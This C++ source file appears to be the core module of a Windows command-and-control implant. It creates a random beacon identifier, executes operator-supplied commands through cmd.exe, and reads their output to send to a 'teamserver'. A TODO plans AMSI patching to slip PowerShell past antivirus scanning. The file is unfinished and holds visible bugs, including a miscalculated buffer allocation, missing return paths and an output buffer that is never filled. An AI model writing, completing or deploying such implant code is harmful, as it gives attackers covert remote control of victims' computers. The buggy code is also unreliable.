#include <iostream>
#include <vector>
#include <string>
#include "Windows.h"
#include "wincrypt.h"
#include "base64.h"
#include "dependencies.h"
#include "process.h"
#include "core.h"

// TBD: This could lead to buffer overflows -> check if it is enough
#define BUFSIZE 4096

// UTF-8 regex
#define UTF8_DETECT_REGEXP  "^([\x09\x0A\x0D\x20-\x7E]|[\xC2-\xDF][\x80-\xBF]|\xE0[\xA0-\xBF][\x80-\xBF]|[\xE1-\xEC\xEE\xEF][\x80-\xBF]{2}|\xED[\x80-\x9F][\x80-\xBF]|\xF0[\x90-\xBF][\x80-\xBF]{2}|[\xF1-\xF3][\x80-\xBF]{3}|\xF4[\x80-\x8F][\x80-\xBF]{2})*$"

core::core() {
	HCRYPTPROV hCryptProv;
	
	// we can use any number of bytes, 128 just feels perfect
	int bufLength = 128;
	BYTE * buf = (BYTE*)malloc(bufLength *sizeof(BYTE));

	// get the Crypto Context
	if (!CryptAcquireContext(
		&hCryptProv,
		NULL,
		NULL,
		PROV_RSA_FULL,
		CRYPT_VERIFYCONTEXT))
	{
		std::cout << "[!] ERROR: CryptAcquireContext " << GetLastError() << std::endl;
	}

	// generate 128 random bytes
	if (!CryptGenRandom(hCryptProv, (DWORD) bufLength, buf)) {
		std::cout << "[!] ERROR: CryptGenRandom " << GetLastError() << std::endl;
	}

	// encode bytes base64
	std::string base64EncodedIdentifier = base64::encode(buf, bufLength);
	// sanitize identifier from anything non-alpha-numeric (we will use it in the URL param)
	base64EncodedIdentifier = dependencies::sanitize_identifier(base64EncodedIdentifier);

	// erase the heap
	if(buf!=NULL)
		free(buf);

	// we will assign the identifier
	this->identifier = base64EncodedIdentifier;
}

core::core(std::string identifier) {
	this->identifier = identifier;
}

std::string core::execute_command(std::string cmd){
	// Some cases:
	// "shell " + anything => spawns and executes a CMD.exe command (fork & run)
	// "powershell " + anything => spawns and executes a POWERSHELL.exe command (fork & run)
	// more will come soon
	// ONE NOTE TO IMPLEMENT: We need an AMSI patching function to be called automatically when executing a powershell command - TODO: @teodor

	// execute CMD.exe
	if (cmd.rfind("shell ", 0) == 0) {
		// replace "shell " part
		cmd = cmd.substr(6, cmd.size() - 6);
		return this->execute_cmd(cmd);
	}

	// execute POWERSHELL.exe
	if (cmd.rfind("powershell ", 0) == 0) {
		// replace "powershell " part
		cmd = cmd.substr(11, cmd.size() - 11);
		return this->execute_powershell(cmd);
	}
}


std::string core::execute_cmd(std::string cmd) {
	std::string result = "";
	std::string fullCommand = "C:\\Windows\\System32\\cmd.exe /c " + cmd;
	// we need wide chars for our process creation function
	std::wstring wideFullCommand = std::wstring(fullCommand.begin(), fullCommand.end());
	// +1 for the NULL ending char
	wchar_t* genericFullCommand = (wchar_t*) malloc(sizeof(wchar_t) * wideFullCommand.size() + 1);
	wcscpy_s(genericFullCommand, wideFullCommand.size()+1, wideFullCommand.c_str());
	PROCESS_INFO* info = process::create_process(genericFullCommand);
	// to read from pipe
	if (info->stdOutRd) {
		this->read_pipe(info->stdOutRd);
	}

	return result;
}

std::string core::execute_powershell(std::string cmd) {
	std::string result = "";

	return result;

}

void core::read_pipe(HANDLE rdPipe) {
	DWORD dwRead;
	CHAR chBuf[BUFSIZE];
	BOOL bSuccess = FALSE;

	for (;;)
	{
		bSuccess = ReadFile(rdPipe, chBuf, BUFSIZE, &dwRead, NULL);
		if (!bSuccess || dwRead == 0) break;


		// Send response to teamserver

		if (!bSuccess) break;
	}
	
}
